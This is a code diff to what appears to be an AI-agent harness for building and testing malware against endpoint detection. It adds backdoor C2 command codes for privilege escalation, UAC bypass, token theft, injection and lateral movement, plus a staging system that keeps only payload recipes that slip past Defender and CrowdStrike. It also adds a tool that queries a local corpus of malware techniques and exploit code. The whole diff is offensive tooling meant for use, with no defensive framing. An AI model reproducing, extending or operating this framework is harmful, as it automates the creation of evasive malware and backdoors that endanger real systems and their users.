@@ -36,9 +36,19 @@ CMD_PROCESSES = 0x03
 CMD_EXEC = 0x0A
 CMD_EXIT = 0x0D
 CMD_NOOP = 0xFF
+# Post-exploitation commands
+CMD_GETSYSTEM = 0x20
+CMD_UAC_BYPASS = 0x21
+CMD_TOKEN = 0x22
+CMD_INJECT = 0x23
+CMD_LATERAL = 0x24
 
-CMD_NAMES = {0x01: "HEARTBEAT", 0x02: "SYSINFO", 0x03: "PROCESSES",
-             0x0A: "EXEC", 0x0D: "EXIT", 0xFF: "NOOP"}
+CMD_NAMES = {
+    0x01: "HEARTBEAT", 0x02: "SYSINFO", 0x03: "PROCESSES",
+    0x0A: "EXEC", 0x0D: "EXIT", 0xFF: "NOOP",
+    0x20: "GETSYSTEM", 0x21: "UAC_BYPASS", 0x22: "TOKEN",
+    0x23: "INJECT", 0x24: "LATERAL",
+}
 
 _BACKDOOR_TEST_COMMANDS = [
     (CMD_SYSINFO, b""),
@@ -424,8 +434,14 @@ class ToolExecutor:
             "results_dir",
             str(Path(__file__).parent.parent / "results"),
         )
+        self.staging_dir = config.get(
+            "staging_dir",
+            str(Path(__file__).parent.parent / "templates" / "chunks" / "recipes" / ".staging"),
+        )
+        Path(self.staging_dir).mkdir(parents=True, exist_ok=True)
         self._last_recipe = ""
         self._last_exfil = ""
+        self._pending_recipes: set[str] = set()
         self._current_edr = config.get("edr", "unknown")
         self._quarantined_hashes: set[str] = set()
         self._quarantine_streak = 0
@@ -864,7 +880,19 @@ class ToolExecutor:
             history = recipe_history.get(name, [])
             if history:
                 latest = history[-1]
-                tag = f" [{latest['verdict']}@{latest.get('edr','?')}]"
+                # Check if burned (3+ consecutive failures)
+                fail_streak = 0
+                for r in reversed(history):
+                    if "FAIL" in r["verdict"]:
+                        fail_streak += 1
+                    else:
+                        break
+                if fail_streak >= 3:
+                    tag = f" [BURNED - {fail_streak}x FAIL@{latest.get('edr','?')}]"
+                elif latest["verdict"] == "PASS":
+                    tag = f" [PROVEN@{latest.get('edr','?')}]"
+                else:
+                    tag = f" [{latest['verdict']}@{latest.get('edr','?')}]"
             else:
                 tag = ""
             results.append(f"{display_name}{tag}")
@@ -876,6 +904,64 @@ class ToolExecutor:
             header += f" — {passes} proven PASS, {fails} known FAIL"
         output = f"{header}:\n" + "\n".join(f"  - {r}" for r in results)
         return self._truncate(output, 2000, "list_recipes")
+
+    async def tool_recipe_status(self, recipe: str) -> str:
+        """Check the status of a recipe: PROVEN, BURNED, UNTESTED, or STAGED."""
+        recipe_name = recipe.replace(".yaml", "")
+
+        # Check if staged (pending validation)
+        staging_path = Path(self.staging_dir) / f"{recipe_name}.yaml"
+        main_path = Path(self.recipes_dir) / f"{recipe_name}.yaml"
+
+        location = ""
+        if staging_path.exists():
+            location = "STAGED (awaiting validation)"
+        elif main_path.exists():
+            location = "RECIPES folder"
+        else:
+            return f"Recipe '{recipe_name}' not found in recipes/ or staging/"
+
+        # Check history
+        recipe_history = self._load_recipe_results()
+        history = recipe_history.get(recipe_name, [])
+
+        if not history:
+            return f"Recipe: {recipe_name}\nLocation: {location}\nStatus: UNTESTED — no validation history"
+
+        # Calculate stats
+        passes = sum(1 for r in history if r["verdict"] == "PASS")
+        fails = sum(1 for r in history if "FAIL" in r["verdict"])
+        latest = history[-1]
+
+        # Check for burn status (3+ consecutive failures)
+        fail_streak = 0
+        for r in reversed(history):
+            if "FAIL" in r["verdict"]:
+                fail_streak += 1
+            else:
+                break
+
+        if fail_streak >= 3:
+            status = f"BURNED ({fail_streak}x consecutive failures)"
+        elif latest["verdict"] == "PASS":
+            status = "PROVEN"
+        else:
+            status = f"FAILING ({latest['verdict']})"
+
+        lines = [
+            f"Recipe: {recipe_name}",
+            f"Location: {location}",
+            f"Status: {status}",
+            f"History: {passes} PASS / {fails} FAIL",
+            f"Last tested: {latest.get('date', '?')} @ {latest.get('edr', '?')}",
+        ]
+
+        # Show recent history
+        lines.append("\nRecent results:")
+        for r in history[-5:]:
+            lines.append(f"  - {r.get('date','?')}: {r['verdict']} @ {r.get('edr','?')} ({r.get('c2_bytes', 0)} bytes)")
+
+        return "\n".join(lines)
 
     @staticmethod
     def _parse_chunk_meta(filepath: Path) -> dict:
@@ -995,6 +1081,55 @@ class ToolExecutor:
             lines.append(f"\n{db.summary()}")
 
         return "\n".join(lines)
+
+    async def tool_query_corpus(self, query: str, collection: str = "malware_techniques",
+                                 n_results: int = 3, language: str = "c_cpp") -> str:
+        """Query the malware corpus (ChromaDB) for evasion techniques and code samples."""
+        logger.info("Querying corpus: %s (collection=%s, n=%d)", query, collection, n_results)
+
+        chroma_path = Path("/home/kei/llm_vault/malware_corpus/data/chroma")
+        if not chroma_path.exists():
+            return "ERROR: Malware corpus not found at expected path"
+
+        try:
+            import chromadb
+            client = chromadb.PersistentClient(path=str(chroma_path))
+
+            # Available collections: malware_techniques (~24K docs), poc_exploits (~30K docs)
+            try:
+                coll = client.get_collection(collection)
+            except Exception:
+                available = [c.name for c in client.list_collections()]
+                return f"ERROR: Collection '{collection}' not found. Available: {', '.join(available)}"
+
+            # Query with optional language filter
+            where_filter = {"language": language} if language else None
+            results = coll.query(
+                query_texts=[query],
+                n_results=n_results,
+                where=where_filter,
+            )
+
+            if not results["documents"] or not results["documents"][0]:
+                return f"No results found for: {query}"
+
+            lines = [f"=== Corpus results for: {query} ===\n"]
+            for i, (doc, meta) in enumerate(zip(results["documents"][0], results["metadatas"][0])):
+                family = meta.get("malware_family", "unknown")
+                source = meta.get("source_file", "")
+                lines.append(f"--- Result {i+1}: {family} ({source}) ---")
+                # Truncate long code samples
+                if len(doc) > 1500:
+                    doc = doc[:1500] + "\n... [truncated]"
+                lines.append(doc)
+                lines.append("")
+
+            return "\n".join(lines)
+
+        except ImportError:
+            return "ERROR: chromadb not installed. Run: pip install chromadb"
+        except Exception as e:
+            return f"ERROR querying corpus: {e}"
 
     # ── Sweep & Analysis ──────────────────────────────────────────────
 
@@ -1181,16 +1316,22 @@ class ToolExecutor:
         if self._blind_mode and recipe_name in self._blind_name_map:
             recipe_name = self._blind_name_map[recipe_name]
         recipe_file = f"{recipe_name}.yaml"
-        recipe_path = Path(self.recipes_dir) / recipe_file
-        if not recipe_path.exists():
-            return f"ERROR: Recipe not found: {recipe_path}"
+        # Check staging dir first (for newly created/mutated recipes), then main recipes dir
+        staging_path = Path(self.staging_dir) / recipe_file
+        main_path = Path(self.recipes_dir) / recipe_file
+        if staging_path.exists():
+            recipe_path = staging_path
+        elif main_path.exists():
+            recipe_path = main_path
+        else:
+            return f"ERROR: Recipe not found: {main_path} (also checked staging)"
 
         with open(recipe_path) as f:
             recipe_data = yaml.safe_load(f)
 
         # Warn (but don't block) if recipe doesn't match target malware type
         target_type = self.config.get("_target_malware_type", "")
-        if target_type:
+        if target_type and target_type != "any":  # "any" skips type check (used by validation mode)
             recipe_lower = recipe.lower()
             type_match = any(t in recipe_lower for t in (target_type, target_type[:5]))
             if not type_match and not any(t in recipe_lower for t in ("cs_pe", "edr", "full", "staged", "stealth", "proven")):
@@ -1517,13 +1658,15 @@ class ToolExecutor:
         recipe["evasion"] = evasion or []
         recipe["vars"] = vars or {"C2_IP": "10.0.2.2", "C2_PORT": "9001"}
 
-        out_path = Path(self.recipes_dir) / f"{name}.yaml"
-        with open(out_path, "w") as f:
+        # Save to staging directory first - only promoted to recipes/ on success
+        staging_path = Path(self.staging_dir) / f"{name}.yaml"
+        with open(staging_path, "w") as f:
             yaml.dump(recipe, f, default_flow_style=False, sort_keys=False)
+        self._pending_recipes.add(name)
 
         self._last_recipe = name
         self._last_exfil = exfil
-        logger.info("Set _last_recipe=%s, _last_exfil=%s from create_recipe", name, exfil)
+        logger.info("Set _last_recipe=%s, _last_exfil=%s from create_recipe (staged)", name, exfil)
 
         self._recipe_lineage[name] = {
             "original_parent": name,
@@ -1531,7 +1674,7 @@ class ToolExecutor:
             "created_new": True,
         }
 
-        return f"Created recipe: {out_path}\nOrigin: NEW — created from scratch during this campaign"
+        return f"Created recipe: {staging_path} (STAGED — will be promoted to recipes/ on success)\nOrigin: NEW — created from scratch during this campaign"
 
     async def tool_mutate_recipe(
         self,
@@ -1591,14 +1734,16 @@ class ToolExecutor:
 
         out_name = new_name or f"{recipe}_mutated"
         data["name"] = out_name
-        out_path = Path(self.recipes_dir) / f"{out_name}.yaml"
+        # Save to staging directory first - only promoted to recipes/ on success
+        staging_path = Path(self.staging_dir) / f"{out_name}.yaml"
 
-        with open(out_path, "w") as f:
+        with open(staging_path, "w") as f:
             yaml.dump(data, f, default_flow_style=False, sort_keys=False)
+        self._pending_recipes.add(out_name)
 
         self._last_recipe = out_name
         self._last_exfil = data.get("exfil", "")
-        logger.info("Set _last_recipe=%s, _last_exfil=%s from mutate_recipe", out_name, self._last_exfil)
+        logger.info("Set _last_recipe=%s, _last_exfil=%s from mutate_recipe (staged)", out_name, self._last_exfil)
 
         parent_key = recipe.replace(".yaml", "")
         parent_lineage = self._recipe_lineage.get(parent_key, {})
@@ -1611,7 +1756,7 @@ class ToolExecutor:
         }
 
         origin = self.get_recipe_origin(out_name)
-        return f"Mutated recipe -> {out_path}\nChanges: {'; '.join(changes)}\nOrigin: {origin}"
+        return f"Mutated recipe -> {staging_path} (STAGED)\nChanges: {'; '.join(changes)}\nOrigin: {origin}"
 
     # ── Deployment ───────────────────────────────────────────────────
 
@@ -2022,11 +2167,11 @@ class ToolExecutor:
         if self._is_backdoor and c2_port in _c2_listeners:
             c2_thread = _c2_listeners[c2_port].get("thread")
             if c2_thread and c2_thread.is_alive():
-                logger.info("Waiting for backdoor C2 to finish command exchange (up to 120s)...")
-                await asyncio.to_thread(c2_thread.join, timeout=120)
+                logger.info("Waiting for backdoor C2 to finish command exchange (up to 30s)...")
+                await asyncio.to_thread(c2_thread.join, timeout=30)
                 logger.info("Backdoor C2 thread done (alive=%s)", c2_thread.is_alive())
         else:
-            await asyncio.sleep(5)
+            await asyncio.sleep(3)
 
         # Wait a bit for EDR post-execution analysis to complete
         await asyncio.sleep(3)
@@ -2149,6 +2294,10 @@ class ToolExecutor:
 
         is_pass = result.failure_type.value == "SUCCESS" and binary_exists and \
                    len(defender_detections) == 0 and len(cs_detections) == 0
+
+        # Handle recipe promotion/cleanup based on result
+        self._handle_recipe_staging(self._last_recipe, is_pass)
+
         if not is_pass:
             failure_desc = (
                 f"Recipe={self._last_recipe}: {result.failure_type.value} — "
@@ -2159,6 +2308,7 @@ class ToolExecutor:
         else:
             self._epoch_call_count = 0
             self._epoch_failures.clear()
+            lines.append(f"\n[PROMOTED] Recipe '{self._last_recipe}' saved to recipes/ folder")
 
         return "\n".join(lines)
 
@@ -2192,6 +2342,36 @@ class ToolExecutor:
             logger.info("Saved recipe result: %s = %s", entry["recipe"], entry["verdict"])
         except Exception as e:
             logger.warning("Could not save recipe result: %s", e)
+
+    def _handle_recipe_staging(self, recipe_name: str, is_pass: bool):
+        """Promote successful recipes to recipes/, delete failed ones from staging."""
+        if recipe_name not in self._pending_recipes:
+            return  # Not a staged recipe, nothing to do
+
+        staging_path = Path(self.staging_dir) / f"{recipe_name}.yaml"
+        if not staging_path.exists():
+            self._pending_recipes.discard(recipe_name)
+            return
+
+        if is_pass:
+            # Promote to main recipes folder
+            dest_path = Path(self.recipes_dir) / f"{recipe_name}.yaml"
+            try:
+                import shutil
+                shutil.copy2(staging_path, dest_path)
+                staging_path.unlink()
+                self._pending_recipes.discard(recipe_name)
+                logger.info("Promoted recipe '%s' to recipes/ folder", recipe_name)
+            except Exception as e:
+                logger.warning("Could not promote recipe '%s': %s", recipe_name, e)
+        else:
+            # Delete failed recipe from staging
+            try:
+                staging_path.unlink()
+                self._pending_recipes.discard(recipe_name)
+                logger.info("Deleted failed recipe '%s' from staging", recipe_name)
+            except Exception as e:
+                logger.warning("Could not delete failed recipe '%s': %s", recipe_name, e)
 
     # ── Cleanup ──────────────────────────────────────────────────────
 
